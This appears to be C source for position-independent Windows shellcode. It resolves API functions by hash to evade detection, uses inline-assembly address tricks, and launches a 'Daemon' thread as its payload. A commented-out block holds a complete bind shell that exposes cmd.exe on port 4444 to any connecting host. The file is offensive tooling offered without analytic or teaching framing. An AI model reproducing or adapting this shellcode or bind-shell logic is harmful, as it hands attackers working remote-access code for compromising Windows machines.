#define WIN32_LEAN_AND_MEAN

#pragma warning( disable : 4201 ) // Disable warning about 'nameless struct/union'

#include "GetProcAddressWithHash.h"
#include "64BitHelper.h"
#include "WinApiDeclare.h"
#include "Daemon.h"
#include <windows.h>
#include <winsock2.h>
#include <intrin.h>

#define BIND_PORT 4444
#define HTONS(x) ( ( (( (USHORT)(x) ) >> 8 ) & 0xff) | ((( (USHORT)(x) ) & 0xff) << 8) )
/*
*/
#if defined(_WIN64)
#else
PVOID KGetGlobalVarAddr( PVOID pVar)
{
  PVOID pCurAddr = NULL;
  __asm
  {
Start:
    call lbl_Next
lbl_Next:
    pop eax
    sub eax, 5
    sub eax, offset Start
    add eax, pVar
    mov pCurAddr, eax
  }
  return pCurAddr;
}
void end_of_file( );
#endif
// Write the logic for the primary payload here
// Normally, I would call this 'main' but if you call a function 'main', link.exe requires that you link against the CRT
// Rather, I will pass a linker option of "/ENTRY:ExecutePayload" in order to get around this issue.
VOID ExecutePayload( VOID )
{/*
	FuncLoadLibraryA MyLoadLibraryA;
	FuncWsaStartup MyWSAStartup;
	FuncWsaSocketA MyWSASocketA;
	FuncBind MyBind;
	FuncListen MyListen;
	FuncAccept MyAccept;
	FuncCloseSocket MyCloseSocket;
	FuncCreateProcess MyCreateProcessA;
	FuncWaitForSingleObject MyWaitForSingleObject;
	WSADATA WSAData;
	SOCKET s;
	SOCKET AcceptedSocket;
	struct sockaddr_in service;
	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION ProcessInformation;
	// Strings must be treated as a char array in order to prevent them from being stored in
	// an .rdata section. In order to maintain position independence, all data must be stored
	// in the same section. Thanks to Nick Harbour for coming up with this technique:
	// http://nickharbour.wordpress.com/2010/07/01/writing-shellcode-with-a-c-compiler/
	char cmdline[] = { 'c', 'm', 'd', 0 };
	char module[] = { 'w', 's', '2', '_', '3', '2', '.', 'd', 'l', 'l', 0 };
	*/
	funcs f ;
	HANDLE hThread[1] ;
	DWORD dwThreadId[1] ;
	#pragma warning( push )
	f.LoadLibraryA				=	( FuncLoadLibraryA )GetProcAddressWithHash( 0x0726774C );
	//pf->LoadLibraryA((LPTSTR) module2);
	f.MessageBox					=	( FuncMessageBox )GetProcAddressWithHash( 0x07568345 ) ;
	#pragma warning( disable : 4055 ) // Ignore cast warnings
	#pragma warning( pop )
	//f.MessageBox( NULL , NULL , NULL , 0 ) ;
	InitialFuncs( &f ) ;	
	hThread[0] = f.CreateThread(
		NULL ,
		0 ,
#if defined(_WIN64)
		(LPTHREAD_START_ROUTINE)Daemon ,
#else
		(LPTHREAD_START_ROUTINE)KGetGlobalVarAddr(Daemon) ,
#endif
		NULL ,
		0 ,
		&dwThreadId[0]
		) ;
	//f.WaitForMultipleObjects( 1 , hThread , TRUE , INFINITE ) ;
	//f.CloseHandle( hThread[0] ) ;
	/*
	*/
	/*
	// Initialize structures. SecureZeroMemory is forced inline and doesn't call an external module
	SecureZeroMemory(&StartupInfo, sizeof(StartupInfo));
	SecureZeroMemory(&ProcessInformation, sizeof(ProcessInformation));
	#pragma warning( push )
	#pragma warning( disable : 4055 ) // Ignore cast warnings
	// Should I be validating that these return a valid address? Yes... Meh.
	// You must call LoadLibrary on the winsock module before attempting to resolve its exports.
	MyLoadLibraryA((LPTSTR) module);
	MyWSAStartup =			(FuncWsaStartup) GetProcAddressWithHash( 0x006B8029 );
	MyWSASocketA =			(FuncWsaSocketA) GetProcAddressWithHash( 0xE0DF0FEA );
	MyBind =				(FuncBind) GetProcAddressWithHash( 0x6737DBC2 );
	MyListen =				(FuncListen) GetProcAddressWithHash( 0xFF38E9B7 );
	MyAccept =				(FuncAccept) GetProcAddressWithHash( 0xE13BEC74 );
	MyCloseSocket =			(FuncCloseSocket) GetProcAddressWithHash( 0x614D6E75 );
	MyCreateProcessA =		(FuncCreateProcess) GetProcAddressWithHash( 0x863FCC79 );
	MyWaitForSingleObject =	(FuncWaitForSingleObject) GetProcAddressWithHash( 0x601D8708 );
	#pragma warning( pop )

	MyWSAStartup( MAKEWORD( 2, 2 ), &WSAData );
	s = MyWSASocketA( AF_INET, SOCK_STREAM, 0, NULL, 0, 0 );

	service.sin_family = AF_INET;
	service.sin_addr.s_addr = 0; // Bind to 0.0.0.0
	service.sin_port = HTONS( BIND_PORT );

	MyBind( s, (SOCKADDR *) &service, sizeof(service) );
	MyListen( s, 0 );
	AcceptedSocket = MyAccept( s, NULL, NULL );
	MyCloseSocket( s );

	StartupInfo.hStdError = (HANDLE) AcceptedSocket;
	StartupInfo.hStdOutput = (HANDLE) AcceptedSocket;
	StartupInfo.hStdInput = (HANDLE) AcceptedSocket;
	StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	StartupInfo.cb = 68;

	MyCreateProcessA( 0, (LPTSTR) cmdline, 0, 0, TRUE, 0, 0, 0, &StartupInfo, &ProcessInformation );
	MyWaitForSingleObject( ProcessInformation.hProcess, INFINITE );
	*/
#if defined(_WIN64)
	wrapper_jmp_end_of_file( ) ;
#else
	__asm{
		jmp end_of_file
	};
#endif
}

#if defined(_WIN64)
#else
void __declspec(naked) end_of_file( ) {
	__asm{
		nop
	};
}
#endif